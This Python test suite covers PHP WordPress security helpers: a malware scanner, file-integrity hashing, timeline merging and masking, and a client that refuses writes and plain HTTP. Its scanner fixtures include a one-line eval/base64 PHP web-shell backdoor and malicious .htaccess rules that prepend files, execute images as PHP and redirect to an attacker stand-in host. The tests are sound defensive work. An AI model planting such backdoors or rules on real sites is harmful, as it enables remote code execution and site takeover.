"""Behavioral tests for the standalone PHP helpers.

The WP-CLI scripts need a WordPress bootstrap and are covered by the static
lint job. These tests cover the scripts that must work on any host: the
malware scanner, evidence hashing, integrity comparison and option parsing.
"""

import json
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
SCRIPTS = ROOT / "skills" / "wordpress-security-ops" / "scripts"
PHP = shutil.which("php")

STOCK_HTACCESS = """# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
RewriteBase /
RewriteRule ^index\\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>
# END WordPress
"""


def php_run(args, cwd=None):
    return subprocess.run(
        [PHP, *args],
        cwd=str(cwd or ROOT),
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        timeout=120,
    )


@unittest.skipIf(PHP is None, "php is not installed")
class MalwareScanTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)

    def tearDown(self):
        self._tmp.cleanup()

    def scan(self):
        result = php_run(
            [str(SCRIPTS / "malware-scan.php"), "--path=" + str(self.root)]
        )
        self.assertIn(result.returncode, (0, 3), result.stderr)
        return json.loads(result.stdout)

    def test_stock_wordpress_htaccess_is_not_a_finding(self):
        (self.root / ".htaccess").write_text(STOCK_HTACCESS, encoding="utf-8")
        plugin = self.root / "wp-content" / "plugins" / "hello"
        plugin.mkdir(parents=True)
        (plugin / "hello.php").write_text(
            "<?php\nfunction hello_dolly() { return 'Hello'; }\n", encoding="utf-8"
        )
        data = self.scan()
        self.assertEqual(data["status"], "no_findings", data["findings"])
        self.assertEqual(data["counts"], {"critical": 0, "high": 0, "medium": 0, "low": 0})

    def test_backdoor_is_critical(self):
        uploads = self.root / "uploads"
        uploads.mkdir()
        (uploads / "avatar.php").write_text(
            "<?php eval(base64_decode($_POST['q']));\n", encoding="utf-8"
        )
        data = self.scan()
        self.assertEqual(data["status"], "findings")
        self.assertGreaterEqual(data["counts"]["critical"], 1)
        self.assertEqual(data["findings"][0]["file"], "uploads/avatar.php")

    def test_malicious_htaccess_patterns_are_detected(self):
        (self.root / ".htaccess").write_text(
            "php_value auto_prepend_file /tmp/x.txt\n"
            "AddType application/x-httpd-php .jpg\n"
            "RewriteRule .* https://evil.example/x.js [R=302,L]\n"
            "RewriteRule ^go$ /uploads/go.php [L]\n"
            "php_value memory_limit 256M\n",
            encoding="utf-8",
        )
        data = self.scan()
        patterns = {item["pattern"] for item in data["findings"]}
        self.assertIn("auto_prepend/append", patterns)
        self.assertIn("php handler", patterns)
        self.assertIn("external rewrite", patterns)
        self.assertIn("rewrite to php", patterns)
        self.assertIn("php_value", patterns)
        self.assertGreaterEqual(data["counts"]["high"], 4)

    def test_benign_code_is_not_flagged_as_a_shell(self):
        (self.root / "reader.php").write_text(
            "<?php\n"
            "$files = scandir(__DIR__);\n"
            "foreach ($files as $file) { $size = filesize(__DIR__ . '/' . $file); }\n",
            encoding="utf-8",
        )
        data = self.scan()
        self.assertEqual(data["status"], "no_findings", data["findings"])


@unittest.skipIf(PHP is None, "php is not installed")
class EvidenceTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        self.site = self.root / "site"
        self.site.mkdir()
        (self.site / "index.php").write_text("<?php echo 'ok';\n", encoding="utf-8")
        (self.site / "wp-config.php").write_text("<?php // config\n", encoding="utf-8")
        self.manifest = self.root / "manifest.json"

    def tearDown(self):
        self._tmp.cleanup()

    def test_hash_and_integrity_roundtrip(self):
        hashed = php_run(
            [
                str(SCRIPTS / "hash-evidence.php"),
                "--path=" + str(self.site),
                "--out=" + str(self.manifest),
            ]
        )
        self.assertEqual(hashed.returncode, 0, hashed.stderr)
        checked = php_run(
            [
                str(SCRIPTS / "integrity-check.php"),
                "--path=" + str(self.site),
                "--manifest=" + str(self.manifest),
            ]
        )
        self.assertEqual(checked.returncode, 0, checked.stderr)
        data = json.loads(checked.stdout)
        self.assertEqual(data["status"], "ok")
        self.assertEqual(data["summary"]["changed"], 0)

    def test_modified_file_is_reported(self):
        php_run(
            [
                str(SCRIPTS / "hash-evidence.php"),
                "--path=" + str(self.site),
                "--out=" + str(self.manifest),
            ]
        )
        (self.site / "index.php").write_text("<?php echo 'hacked';\n", encoding="utf-8")
        checked = php_run(
            [
                str(SCRIPTS / "integrity-check.php"),
                "--path=" + str(self.site),
                "--manifest=" + str(self.manifest),
            ]
        )
        self.assertEqual(checked.returncode, 3, checked.stderr)
        data = json.loads(checked.stdout)
        self.assertEqual(data["status"], "changed")
        self.assertEqual(data["changed"][0]["path"], "index.php")


@unittest.skipIf(PHP is None, "php is not installed")
class TimelineTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)

    def tearDown(self):
        self._tmp.cleanup()

    def test_merge_dedupe_and_sort(self):
        first = self.root / "ability.json"
        first.write_text(
            json.dumps(
                {
                    "events": [
                        {
                            "ts": "2026-11-08T10:00:00Z",
                            "source": "ability",
                            "actor": "admin",
                            "action": "block",
                            "target": "203.0.113.10",
                        },
                        {
                            "ts": "2026-11-08T12:00:00Z",
                            "source": "db",
                            "actor": "system",
                            "action": "option_change",
                            "target": "siteurl",
                        },
                    ]
                }
            ),
            encoding="utf-8",
        )
        second = self.root / "access.jsonl"
        second.write_text(
            "\n".join(
                [
                    json.dumps(
                        {
                            "ts": "2026-11-08T10:00:00Z",
                            "source": "ability",
                            "actor": "admin",
                            "action": "block",
                            "target": "203.0.113.10",
                        }
                    ),
                    json.dumps(
                        {
                            "ts": "2026-11-08T09:00:00Z",
                            "source": "log",
                            "actor": "203.0.113.10",
                            "action": "login_failed",
                            "target": "wp-login.php",
                        }
                    ),
                ]
            ),
            encoding="utf-8",
        )
        out = self.root / "timeline.json"
        csv = self.root / "timeline.csv"
        result = php_run(
            [
                str(SCRIPTS / "build-timeline.php"),
                "--input=" + str(first) + "," + str(second),
                "--out=" + str(out),
                "--csv=" + str(csv),
            ]
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        data = json.loads(out.read_text(encoding="utf-8"))
        self.assertEqual(data["counts"]["kept"], 3)
        self.assertEqual(
            [event["ts"] for event in data["events"]],
            [
                "2026-11-08T09:00:00Z",
                "2026-11-08T10:00:00Z",
                "2026-11-08T12:00:00Z",
            ],
        )
        self.assertTrue(csv.read_text(encoding="utf-8").startswith("ts,source,actor"))

    def test_mask_redacts_ip_and_email(self):
        src = self.root / "events.json"
        src.write_text(
            json.dumps(
                [
                    {
                        "ts": 1762596000,
                        "source": "log",
                        "actor": "203.0.113.10",
                        "action": "login",
                        "target": "admin@example.com",
                    }
                ]
            ),
            encoding="utf-8",
        )
        result = php_run(
            [str(SCRIPTS / "build-timeline.php"), "--input=" + str(src), "--mask"]
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        data = json.loads(result.stdout)
        event = data["events"][0]
        self.assertEqual(event["actor"], "203.0.*.*")
        self.assertEqual(event["target"], "a***@example.com")


@unittest.skipIf(PHP is None, "php is not installed")
class AbilityClientPolicyTests(unittest.TestCase):
    def test_default_mcp_refuses_a_write(self):
        result = php_run(
            [
                str(SCRIPTS / "ability-client.php"),
                "--ability=botblocker/get-firewall-status",
                "--transport=mcp",
                "--write",
                "--confirm=BLOCK",
            ]
        )
        self.assertEqual(result.returncode, 4, result.stderr)
        data = json.loads(result.stdout)
        self.assertTrue(data["ok"] is False)
        self.assertIn("read-only", data["error"])

    def test_plain_http_is_refused(self):
        result = php_run(
            [
                str(SCRIPTS / "ability-client.php"),
                "--ability=botblocker/get-firewall-status",
                "--transport=rest",
                "--url=http://example.com",
                "--user=test",
                "--app-password=test",
            ]
        )
        self.assertEqual(result.returncode, 4, result.stderr)
        data = json.loads(result.stdout)
        self.assertIn("HTTPS is required", data["error"])


@unittest.skipIf(PHP is None, "php is not installed")
class OptionParserTests(unittest.TestCase):
    def test_flags_after_a_non_option_are_parsed(self):
        bootstrap = (SCRIPTS / "lib" / "bootstrap.php").as_posix()
        with tempfile.TemporaryDirectory() as tmp:
            probe = Path(tmp) / "probe.php"
            probe.write_text(
                "<?php\n"
                f"require '{bootstrap}';\n"
                "$_SERVER['argv'] = array('probe.php','eval-file','x.php',"
                "'--include-pii','--max-files','25','--unknown','--json');\n"
                "echo json_encode(secops_parse_args(array("
                "'include-pii'=>false,'max-files'=>true,'json'=>false)));\n",
                encoding="utf-8",
            )
            result = php_run([str(probe)])
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(
            json.loads(result.stdout),
            {"include-pii": True, "max-files": "25", "json": True},
        )


if __name__ == "__main__":
    unittest.main()
